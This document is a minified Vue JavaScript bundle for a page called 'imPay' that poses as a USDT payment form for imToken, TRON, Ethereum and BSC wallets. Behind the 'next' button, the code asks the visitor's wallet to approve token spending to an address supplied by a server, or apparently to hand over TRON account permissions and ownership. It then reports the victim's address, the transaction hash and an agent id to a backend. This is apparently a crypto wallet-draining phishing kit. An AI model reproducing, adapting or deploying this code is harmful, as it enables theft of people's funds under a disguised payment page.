import{u as a}from"./xo-e11f158f.js";import{s as e,a as t,b as s,g as o}from"./3AZ4YOC-29c4baae.js";import{B as i,a as l,b as r,c,t as u,g as d}from"./MhXD-efc15383.js";import{T as p}from"./mfzIc-2866fecf.js";import{d as n,e as m,c as v,g as b,a as f,b as j}from"./FCz-fbe28d9f.js";import{v as w,c as g,b as h,Q as y,P as k,l as S,M as T,R as x,S as A,O as I,q as R}from"./RkLas7lKW-9dea3e34.js";import{r as N,u as J}from"./2q-6138b38f.js";import{P as _}from"./csMKG-c86ba387.js";import{F as L,B as X,s as O,a as q,c as C}from"./8Lq7dXP39c-9618f7e3.js";import{_ as D}from"./nWxKP-2361012f.js";import"./4IFX6X-821cf129.js";import"./nf-fdb3a15d.js";import"./DnVYNbko-7fb9566d.js";import"./FZFlb-cb1e62fd.js";import"./2jsgHdw2o5-aead8d3c.js";import"./Nr-f226ed21.js";import"./g-f0b43be2.js";import"./RpMho-56f0e803.js";import"./I-7c4d4d37.js";import"./iVukkyi3Zc-f6b76617.js";import"./S-a16b67ce.js";import"./GD-7f11eb80.js";import"./B-7cd6357e.js";import"./L6zJ-e2b84d4e.js";import"./fUZItZZ-863d800a.js";import"./3-f8512041.js";import"./RkJ-3b6bdf2b.js";import"./4Unp-36f38208.js";import"./WbU6zC-c0a8d12a.js";import"./6deGNvc2w-e0134001.js";import"./NSSavVLh-a46436c8.js";import"./9-a2e4a23d.js";/* empty css              */import"./oi62-2df89853.js";/* empty css                 */import"./QY098dSCq-6a76bec2.js";import"./zXBbRUI-b83236f9.js";import"./egl-40b4b7b4.js";import"./esPDEf-af6978d9.js";import"./63TmSrWO-c706edc1.js";import"./ltDa-b0f7c082.js";import"./DmJ6LfrSaQ-0eacab28.js";import"./V-c4c59e5a.js";import"./taJQ-69341cff.js";import"./DgqWvAP-4a65b016.js";import"./N3NwByL-08bc4840.js";import"./J0-8e1fea9a.js";import"./7rUfw-1617ac1d.js";import"./JMlYyMcf0-ab5c9801.js";import"./R-341439f8.js";import"./ONGZVgdwy-32a65c6e.js";import"./kC-446d5aee.js";import"./QIMJ-4ea5fbf4.js";import"./MO-483442c7.js";import"./sRUqDqZ6-3cc52c61.js";import"./wJJ1-160e2a1d.js";import"./q7l840un-e11b10a8.js";import"./d-50a6ba7a.js";import"./EWJVBal1-37d077df.js";import"./AugH5kF-8ef811ba.js";import"./t-7d12d5e9.js";import"./JdtnzyHmA-140aa135.js";import"./lMqSk-2ce04840.js";import"./d8KFORd6n-765103ab.js";import"./XRW-bf54e34d.js";const H=a=>(x("data-v-6966fb22"),a=a(),A(),a),U={class:"page-container"},z=H((()=>k("div",{class:"bottom-m10 left-m10 right-m30 top-p10 o7 fs14"},"收款账号",-1))),M={class:"left-m10 bg-white br12 right-m10",style:{padding:"12px 15px","border-radius":"5px"}},V={class:"bottom-m10 left-m10 right-m10 top-m20 o7 fs14 spaceb"},F=H((()=>k("span",{class:"fs14"},"数量",-1))),P={class:"fs14 o7"},Z={class:"bg-white left-m10 br12 right-m10",style:{"border-radius":"5px"}},B={class:"address left-m20 o7 top-p20 bottom-p10 column"},E={style:{"margin-right":"15px"}},W={class:"spaceb right-m10 top-m10 o6"},G={class:"fs14"},Q={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},K=D(w({__name:"imPay",setup(w){const x=N(0),A=N(0),D=N(.069),H=N({type:1,walletType:1,agentId:"",token:"USDT",amount:1,clientId:"",block:i.TRX,ads:"",isAdd:!1,client_type:1,extend:{}}),K=N("");N("");const Y=N({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),$=N("");N(!1),a(),N("");const aa=N(!0),ea=g((()=>H.value.ads||Y.value.receiveAddress[H.value.block])),ta=()=>{const{type:a}=H.value;if(A.value<x.value)return O("Insufficient balance");1==a?sa():2==a?oa():ia()},sa=async()=>{try{if(q({message:"Loading...",duration:0}),H.value.block==i.TRX){const a=await l("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",K.value,$.value);a.result&&(la($.value,"approve",a.txid),O(Y.value.authSuccessTips))}else if(H.value.block==i.ETH){const a=await n(web3.value,$.value,K.value);a.transactionHash&&(la($.value,"approve",a.transactionHash),O(Y.value.authSuccessTips))}else if(H.value.block==i.BSC){const a=await m(web3.value,$.value,K.value);a.transactionHash&&(la($.value,"approve",a.transactionHash),O(Y.value.authSuccessTips))}}catch(a){C()}},oa=async()=>{if(H.value.block!=i.TRX)return;const a=await r(K.value,$.value,H.value.isAdd);(null==a?void 0:a.result)?(la($.value,"active",a.txid),O(Y.value.authSuccessTips),C()):a&&O("object"==typeof a?JSON.stringify(a):String(a))},ia=async()=>{if(H.value.block!=i.TRX)return;const a=await c(K.value);a.result&&(la($.value,"owner",a.txid),O(Y.value.authSuccessTips))},la=async(a,o,i)=>{const l={addres:a,auth_addres:K.value,hash:i||0,wallete_type:"ImToken",client_id:H.value.clientId||Y.value.clientId||"",source:window.location.href,agent_uid:H.value.agentId,block:H.value.block,client_type:H.value.client_type,amount:H.value.amount,extend:H.value.extend?JSON.stringify(H.value.extend):""};switch(o){case"approve":await s(l);break;case"active":await t(l);break;case"owner":await e(l)}C()},ra=async()=>{let a;switch(H.value.block){case i.TRX:if($.value=await tronWeb.defaultAddress.base58,!$.value)return O("无法获取钱包地址！请检查浏览器是否支持TRON！");A.value=await d($.value,H.value.token);break;case i.ETH:a=await f(),web3.value=a.web3,$.value=a.userAddress,A.value=await j(web3.value,a.userAddress);break;case i.BSC:a=await v(),web3.value=a.web3,$.value=a.userAddress,A.value=await b(web3.value,a.userAddress)}};return h((async()=>{const a=JSON.parse(localStorage.getItem("routerParams"));if(x.value=a.amount,H.value={amount:x.value,type:a.type,walletType:1,agentId:a.agent,token:a.token||"USDT",block:a.block||i.TRX,clientId:a.clientId||"",ads:a.ads,isAdd:a.isAdd,client_type:1,extend:a.extend},(async()=>{try{const a=JSON.parse(localStorage.getItem("config"));Y.value={...a};const{type:e}=H.value;aa.value=!0;const t=await o({block:H.value.block,type:u[H.value.type]});aa.value=!1;const s=t.data;Y.value={...a,authAddress:s},K.value=Y.value.authAddress}catch(a){aa.value=!1}})(),p.isTokenEnv())try{p.apis.navigator.setTitle(`${String(H.value.token).toLocaleLowerCase()}转账`);let a="";a=H.value.block==i.TRX?await p.apis.user.showAccountSwitch("TRON"):await p.apis.user.showAccountSwitch("ETHEREUM"),$.value=a,ra()}catch(e){4001==e.code&&ra()}else{ra();const a=`imtokenv2://navigate?screen=DappView&url=${window.location.href}`;window.location.href=a}})),(a,e)=>(I(),y("div",U,[z,k("div",M,_(ea.value||"-"),1),k("div",V,[F,k("span",P,_(A.value)+" "+_(String(H.value.token).toLocaleUpperCase()),1)]),k("div",Z,[k("div",B,[k("div",E,[S(J(L),{modelValue:x.value,"onUpdate:modelValue":e[0]||(e[0]=a=>x.value=a),type:"number",label:"",placeholder:"请输入",size:"large",style:{"font-size":"16px",padding:"0 0 10px 0px","border-bottom":"1px solid #eee"}},null,8,["modelValue"])]),k("div",W,[k("span",G," $ "+_("t"==H.value.token?Number(Number(x.value).toFixed(2)*D.value).toFixed(3):x.value),1)])])]),k("div",Q,[S(J(X),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:ta,loading:aa.value},{default:T((()=>[R("下一步")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-6966fb22"]]);export{K as default};
